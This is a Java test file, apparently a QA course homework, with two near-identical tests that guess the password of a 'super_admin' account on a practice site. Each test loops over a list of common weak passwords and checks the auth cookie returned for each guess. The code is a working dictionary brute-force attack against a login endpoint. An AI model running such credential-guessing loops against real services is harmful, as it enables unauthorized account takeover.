import groovyjarjarpicocli.CommandLine;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Assertions;
import org.junit.jupiter.api.Test;
import io.restassured.RestAssured;

import java.util.*;

import org.junit.runner.RunWith;

public class FindPassword {

    @Test
    public void findPassword() {


       HashMap<String, String> date = new HashMap<>();
       date.put("login", "super_admin");
        String[] findPassword ={"password","123456","123456789","12345678","12345","qwerty",
                "qwerty", "abc123","football","1234567","monkey","letmein","111111","1234567890",
                "letmein","dragon","baseball","1234","sunshine","iloveyou","trustno1","princess","adobe123[a]",
                "123123","login","admin","princess","trustno1","monkey","welcome","solo","1q2w3e4r",
                "master","sunshine","666666","master","photoshop[a]","1qaz2wsx","qwertyuiop",
                "passw0rd","shadow","lovely","shadow","ashley","master","654321","7777777",
                 "michael","login","!@#$%^&*","jesus","password1","superman","princess","hello",
                "charlie",	"888888","superman","michael","princess","696969","qwertyuiop","hottie",
                "freedom","aa123456","qazwsx",	"ninja","azerty","loveme","whatever","donald",
                 "mustang","trustno1","batman","zaq1zaq1","qazwsx","password1","Football","000000",
                "trustno1",	"starwars",	"123qwe"};
 //       Arrays.sort(findPassword);
   //    System.out.println(Arrays.toString(findPassword));

        // searching for password in the loop

       for(int i=0; i<findPassword.length;i++){
        date.put("password",findPassword[i]);
                Response getResponse = RestAssured
                        .given()
                        .body(date)
                        .when()
                        .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                        .andReturn();
       //         getResponse.prettyPrint();
         //put auth cookie and [i] password
                String authCookie = getResponse.getCookie("auth_cookie");
                Map<String, String> cookies = new HashMap<>();
                cookies.put("auth_cookie", authCookie);
                Response responseForPassword = RestAssured
                        .given()
                        .body(date)
                        .cookies(cookies)
                        .when()
                        .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                        .andReturn();
      //  responseForPassword.print();
        String realPassword = responseForPassword.asString();

           if(realPassword.equals("You are authorized")){
               System.out.println(date);
               break;
           }

        }
    }
    @Test
    public void searchForPassword(){

        Map<String,String>data = new HashMap<>();
        data.put("login","super_admin");
        String[]passwordVariant ={"password","123456","123456789","12345678","12345","qwerty",
                "qwerty", "abc123","football","1234567","monkey","letmein","111111","1234567890",
                "letmein","dragon","baseball","1234","sunshine","iloveyou","trustno1","princess","adobe123[a]",
                "123123","login","admin","princess","trustno1","monkey","welcome","solo","1q2w3e4r",
                "master","sunshine","666666","master","photoshop[a]","1qaz2wsx","qwertyuiop",
                "passw0rd","shadow","lovely","shadow","ashley","master","654321","7777777",
                "michael","login","!@#$%^&*","jesus","password1","superman","princess","hello",
                "charlie",	"888888","superman","michael","princess","696969","qwertyuiop","hottie",
                "freedom","aa123456","qazwsx",	"ninja","azerty","loveme","whatever","donald",
                "mustang","trustno1","batman","zaq1zaq1","qazwsx","password1","Football","000000",
                "trustno1",	"starwars",	"123qwe"};
        for (String i :passwordVariant){
            data.put("password",i);
         Response response = RestAssured
                 .given()
                 .body(data)
                 .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                 .andReturn();

         String authCookie = response.getCookie("auth_cookie");
         Map<String,String> checkCookie = new HashMap<>();
         checkCookie.put("auth_cookie",authCookie);
         Response responseAuth = RestAssured
                 .given()
                 .cookies(checkCookie)
                 .body(data)
                 .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                 .andReturn();
         String password = responseAuth.asString();
         if(password.equals("You are authorized")){
                System.out.println(data);
                break;

            }
        }


    }
}

